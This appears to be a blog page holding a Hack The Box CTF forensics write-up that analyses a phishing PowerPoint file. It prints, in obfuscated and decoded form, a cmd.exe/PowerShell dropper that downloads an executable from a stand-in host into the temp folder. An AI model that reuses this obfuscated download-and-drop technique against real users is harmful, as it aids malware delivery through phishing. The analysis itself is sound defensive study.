@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>Argv</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/img/icon.svg">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" rel="home">
+			<div class="logo__item logo__imagebox">
+					<img class="logo__img" src="/img/argv_title.PNG">
+				</div>
+		</a>
+	</div>
+		
+<nav class="menu">
+	<button class="menu__btn" aria-haspopup="true" aria-expanded="false" tabindex="0">
+		<span class="menu__btn-title" tabindex="-1">Menu</span>
+	</button>
+	<ul class="menu__list">
+		<li class="menu__item">
+			<a class="menu__link" href="/blog/">
+				
+				<span class="menu__text">Blog</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/notebooks/">
+				
+				<span class="menu__text">Notebooks</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/resources/">
+				
+				<span class="menu__text">Resources</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/writeups-reports/">
+				
+				<span class="menu__text">Writeups &amp; Reports</span>
+				
+			</a>
+		</li>
+	</ul>
+</nav>
+
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">Hack The Box: Alienphish</h1>
+			<div class="post__meta meta">
+<div class="meta__item-datetime meta__item">
+	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0C7 0 1 6 1 14s6 14 14 14 14-6 14-14S23 0 15 0zm0 25C9 25 4 20 4 14S9 3 15 3s11 5 11 11-5 11-11 11zm1-18h-2v8.4l6.8 4.4L22 18l-6-3.8V7z"/></svg><time class="meta__text" datetime="2021-04-26T18:20:20-05:00">April 26, 2021</time></div><div class="meta__item-categories meta__item"><svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2l1 2h8v11h-16v-13z"/></svg><span class="meta__text"><a class="meta__link" href="/categories/forensics/" rel="category">Forensics</a>, <a class="meta__link" href="/categories/writeups/" rel="category">Writeups</a>, <a class="meta__link" href="/categories/ctf/" rel="category">Ctf</a>, <a class="meta__link" href="/categories/hackthebox/" rel="category">Hackthebox</a>
+	</span>
+</div></div>
+		</header>
+		
+<div class="post__toc toc">
+	<div class="toc__title">Page content</div>
+	<div class="toc__menu">
+		<nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#extracting-objects-from-phishing-pptx-file">Extracting objects from phishing .pptx file</a></li>
+</ul></li>
+<li><a href="#decoding-our-strange-cmd-instruction-string">Decoding our strange cmd instruction string</a></li>
+<li><a href="#follow-your-instincts-and-get-the-flag">Follow your instincts and get the flag!</a></li>
+</ul></li>
+</ul>
+</nav>
+	</div>
+</div><div class="content post__content clearfix">
+			<p>This CTF was part of the event hosted at ctf.hackthebox.eu &ldquo;Cyberapocalypse&rdquo;.
+Mission: Find a payload and a flag inside &ldquo;Alien Weaknesses.pptx&rdquo;,</p>
+
+<hr />
+
+<h3 id="extracting-objects-from-phishing-pptx-file">Extracting objects from phishing .pptx file</h3>
+
+<p><strong>Using oletools:</strong></p>
+
+<pre><code>argandov@Kali:/mnt/c/Users/nitro/Downloads/forensics_alienphish$ oleobj 'Alien Weaknesses.pptx'
+oleobj 0.56.1 - http://decalage.info/oletools
+THIS IS WORK IN PROGRESS - Check updates regularly!
+Please report any issue at https://github.com/decalage2/oletools/issues
+
+-------------------------------------------------------------------------------
+File: 'Alien Weaknesses.pptx'
+Found relationship 'hyperlink' with external link cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20exe.x/neila.htraeyortsed/:ptth%20rwi%20;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'%20+%20pmet:vne$%20=%20o$%22%20c-%20llehsrewop&amp;&amp;for%20/L%20%25X%20in%20(122;-1;0)do%20set%20kCX=!kCX!!yM:~%25X,1!&amp;&amp;if%20%25X%20leq%200%20call%20%25kCX:*kCX!=%25%22
+Found relationship 'hyperlink' with external link cmd.exe
+
+cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20exe.x/neila.htraeyortsed/:ptth%20rwi%20;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'%20+%20pmet:vne$%20=%20o$%22%20c-%20llehsrewop&amp;&amp;for%20/L%20%25X%20in%20(122;-1;0)do%20set%20kCX=!kCX!!yM:~%25X,1!&amp;&amp;if%20%25X%20leq%200%20call%20%25kCX:*kCX!=%25%22
+</code></pre>
+
+<p>*We could also unzip the .pptx file and look into each .xml inside it.</p>
+
+<h2 id="decoding-our-strange-cmd-instruction-string">Decoding our strange cmd instruction string</h2>
+
+<p><strong>Using a javascript console:</strong></p>
+
+<pre><code>decodeURI(&quot;cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20exe.x/neila.htraeyortsed/:ptth%20rwi%20;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'%20+%20pmet:vne$%20=%20o$%22%20c-%20llehsrewop&amp;&amp;for%20/L%20%25X%20in%20(122;-1;0)do%20set%20kCX=!kCX!!yM:~%25X,1!&amp;&amp;if%20%25X%20leq%200%20call%20%25kCX:*kCX!=%25%22&quot;)
+</code></pre>
+
+<p><strong>result:</strong></p>
+
+<pre><code>&quot;cmd.exe /V:ON/C\&quot;set yM=\&quot;o$ eliftuo- exe.x/neila.htraeyortsed/:ptth rwi ;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q' + pmet:vne$ = o$\&quot; c- llehsrewop&amp;&amp;for /L %X in (122;-1;0)do set kCX=!kCX!!yM:~%X,1!&amp;&amp;if %X leq 0 call %kCX:*kCX!=%\&quot;&quot;
+</code></pre>
+
+<p><strong>Making sense of our cmd instruction set:</strong></p>
+
+<p>I chose to reverse the whole string between the variable &ldquo;yM&rdquo; assignment and the start of the &ldquo;for loop&rdquo;, getting this:</p>
+
+<pre><code>powershell -c \&quot;$o = $env:temp + 'Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99.exe'; iwr http:/destroyearth.alien/x.exe -outfile $o\&quot;
+</code></pre>
+
+<p><em>This can also be done with bash:</em></p>
+
+<pre><code>    argandov@Kali:~$ cat cmd_instr.txt | rev
+
+    *Thanks to @Networkrecon for the tip*
+</code></pre>
+
+<p><strong>The instructions then are clear:</strong></p>
+
+<ol>
+<li><code>/V:ON</code> -&gt; delayed environment variable expansion</li>
+<li><code>/C</code> -&gt; &ldquo;Carries out the command specified by string and then stops&rdquo;</li>
+</ol>
+
+<p>Then stores the reversed instruction into a variable called <code>yM</code>, which will be iterated through, character by character to get a new string, which then will be executed by <code>call %kCX:*kCX!=%</code>.</p>
+
+<p>Our variable &ldquo;o&rdquo; consists on the temp directory + a strange looking name for a .exe file, which is the name of the &ldquo;outfile&rdquo; used by powershell to get the iwr function: <code>iwr http:/destroyearth.alien/x.exe -outfile $o\&quot;</code> uses &ldquo;Invoke web request&rdquo; or &ldquo;iwr&rdquo;, reaching out to some remote server, to get a &ldquo;x.exe&rdquo; file, and will then try to store it with &ldquo;-outfile&rdquo; as our &ldquo;o&rdquo; variable.</p>
+
+<h2 id="follow-your-instincts-and-get-the-flag">Follow your instincts and get the flag!</h2>
+
+<p>The fact that &ldquo;Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99.exe&rdquo; is not reasonable at all, and that the remote http server is called only with one slash &ldquo;/&rdquo;, calls to our attention that there is something about the name of the .exe itself and that the domain &ldquo;destroyearth.alien&rdquo; is only a decoy for this exercise.</p>
+
+<p>After some testing, we decoded the &ldquo;Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99&rdquo; name of the executable from Base64:</p>
+
+<pre><code>argandov@Kali:~$ echo Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99 | base64 -d
+CHTB{pH1sHiNg_w0_m4cr0sbase64: invalid input
+</code></pre>
+
+<p><strong>And we got our flag!</strong></p>
+
+<p>There was no reason to think &ldquo;Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99.exe&rdquo; could be the flag itself, base64 encoded, so I guess this was pure luck!</p>
+		</div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/writeups-reports/brainpan/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">Tryhackme writeup: Brainpan</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/writeups-reports/files/cicada/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">Tryhackme: Cicada 3301 Vol. 1</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			<aside class="sidebar"><div class="widget-search widget">
+	<form class="widget-search__form" role="search" method="get" action="https://duckduckgo.com/">
+		<label>
+			<h5>Not quite what you needed? Try searching something in Duck Duck Go!</h5>
+			<input class="widget-search__field" type="Search" placeholder="SEARCH…" value="" name="q" aria-label="SEARCH…">
+		</label>
+		<input class="widget-search__submit" type="submit" value="Search">
+		
+		<input type="hidden" name="sites" value=""/> 
+	</form>
+</div>
+<div class="widget-categories widget">
+	<h4 class="widget__title">News</h4>
+	<div class="widget__content">
+		<ul class="widget__list">
+		           
+		
+			<li class="widget__item">
+				<a class="widget__link" href="https://www.scmagazine.com/" target="_blank">SC Magazine</a> <br>
+                <a class="widget__link" href="https://www.darkreading.com/" target="_blank">Dark Reading</a>
+			</li>
+	
+		</ul>
+	</div>
+</div>
+
+
+
+
+<div class="widget-recent widget">
+	<h4 class="widget__title">Recent Posts</h4>
+	<div class="widget__content">
+		<ul class="widget__list">
+			<li class="widget__item"><a class="widget__link" href="/resources/d_over_resources/">Digital Overdose Conference Resources &amp; Readings</a></li>
+			<li class="widget__item"><a class="widget__link" href="/resources/training-sites/exploits/">Buffer Overflows &amp; Exploits.</a></li>
+			<li class="widget__item"><a class="widget__link" href="/resources/training-sites/re-bof/">Reverse Engineering</a></li>
+		</ul>
+	</div>
+</div>
+<div class="widget-categories widget">
+	<h4 class="widget__title">Categories</h4>
+	<div class="widget__content">
+		<ul class="widget__list">
+			<li class="widget__item">
+				<a class="widget__link" href="/categories/buffer-overflow/">Buffer Overflow</a>
+			</li>
+			<li class="widget__item">
+				<a class="widget__link" href="/categories/crypto/">Crypto</a>
+			</li>
+			<li class="widget__item">
+				<a class="widget__link" href="/categories/ctf/">Ctf</a>
+			</li>
+			<li class="widget__item">
+				<a class="widget__link" href="/categories/forensics/">Forensics</a>
+			</li>
+			<li class="widget__item">
+				<a class="widget__link" href="/categories/hackthebox/">Hackthebox</a>
+			</li>
+			<li class="widget__item">
+				<a class="widget__link" href="/categories/hardening/">Hardening</a>
+			</li>
+			<li class="widget__item">
+				<a class="widget__link" href="/categories/tools/">Tools</a>
+			</li>
+			<li class="widget__item">
+				<a class="widget__link" href="/categories/tryhackme/">Tryhackme</a>
+			</li>
+			<li class="widget__item">
+				<a class="widget__link" href="/categories/writeups/">Writeups</a>
+			</li>
+		</ul>
+	</div>
+</div>
+<div class="widget-taglist widget">
+	<h4 class="widget__title">Tags</h4>
+	<div class="widget__content">
+		<a class="widget-taglist__link widget__link btn" href="/tags/cybersecurity/" title="Cybersecurity">Cybersecurity</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/health-hacking/" title="Health Hacking">Health Hacking</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/linux/" title="Linux">Linux</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/philosophy/" title="Philosophy">Philosophy</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/ssh/" title="Ssh">Ssh</a>
+	</div>
+</div>
+</aside>
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2021 Argandov.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a>. Theme created by <a href="https://github.com/Vimux" rel="nofollow noopener" target="_blank">Vimux</a></span>
+		</div>
+	</div>
+</footer>
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
